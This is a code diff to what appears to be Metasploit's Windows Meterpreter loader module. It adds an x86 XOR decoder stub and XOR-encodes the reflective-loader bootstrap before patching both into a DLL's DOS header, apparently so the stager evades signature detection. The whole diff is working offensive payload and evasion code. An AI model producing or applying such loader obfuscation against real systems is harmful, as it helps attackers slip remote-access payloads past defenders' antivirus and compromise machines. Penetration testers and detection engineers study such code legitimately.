@@ -36,17 +36,11 @@ module Payload::Windows::MeterpreterLoader
   def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
-          dec ebp               ; 'M'
-          pop edx               ; 'Z'
-          call $+5              ; call next instruction
-          pop ebx               ; get the current location (+7 bytes)
-          push edx              ; restore edx
-          inc ebp               ; restore ebp
           push ebp              ; save ebp for later
           mov ebp, esp          ; set up a new stack frame
         ; Invoke ReflectiveLoader()
           ; add the offset to ReflectiveLoader() (0x????????)
-          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
+          add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 8)}
           call ebx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
@@ -107,13 +101,43 @@ module Payload::Windows::MeterpreterLoader
     # generate the bootstrap asm
     bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
 
+    # Add xor decoder
+    xor = Rex::Encoding::Xor::Byte
+    xor_key = rand(2**8)
+    decoder = %Q^
+      dec ebp               ; 'M'
+      pop edx               ; 'Z'
+      cld
+      call $+5              ; call next instruction
+      pop ebx               ; get the current location (+7 bytes)
+      push edx              ; restore edx
+      inc ebp               ; restore ebp
+      mov esi, ebx
+      add esi, 21
+      mov ecx, #{bootstrap.length}
+    decode:
+      xor byte ptr [esi], #{"0x%.2x" % xor_key}
+      add esi, 1
+      loop decode
+    ^
+    xor_decoder = Metasm::Shellcode.assemble(Metasm::X86.new, decoder).encode_string
+    print_status("Assembled decoder stub")
+
+    # XOR the payload
+    xor_payload = xor.encode(bootstrap, [xor_key].pack("C"))[0]
+    print_status("XOR encoded bootstrap")
+
     # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry
-    if bootstrap.length > 62
+    total_length = bootstrap.length + xor_decoder.length
+    if total_length > 62
       raise RuntimeError, "Meterpreter loader (x86) generated an oversized bootstrap!"
     end
 
     # patch the bootstrap code into the dll's DOS header...
-    dll[ 0, bootstrap.length ] = bootstrap
+    #dll[ 0, bootstrap.length ] = bootstrap
+    print_status("Updating DLL with decoder and bootstrap")
+    dll[ 0, xor_decoder.length ] = xor_decoder
+    dll[ xor_decoder.length, bootstrap.length ] = xor_payload
 
     dll
   end
